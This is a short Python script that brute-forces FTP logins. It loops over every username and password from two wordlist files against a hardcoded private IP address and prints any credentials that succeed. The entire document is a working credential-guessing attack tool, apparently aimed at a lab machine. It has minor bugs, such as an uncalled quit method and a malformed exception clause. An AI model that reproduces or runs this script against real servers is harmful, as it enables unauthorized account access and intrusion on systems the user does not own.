import ftplib

def bruteforce_ftp(ip,user,passw):
	ftp = ftplib.FTP(ip)
	try:
		ftp.login(user,passw)
		ftp.quit
		print('(+) Found credentials')
		print(f'User: {user}\nPassword: {passw}')
	except:
		print("(-) Fail credentials")

def main():
	ip = "192.168.109.140"
	users = open('user.txt','r')
	users = users.read().split('\n')
	passwords = open("password.txt",'r')
	passwords = passwords.read().split('\n')

	for user in users:
		for password in passwords:
				bruteforce_ftp(ip,user,password)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt():
		exit()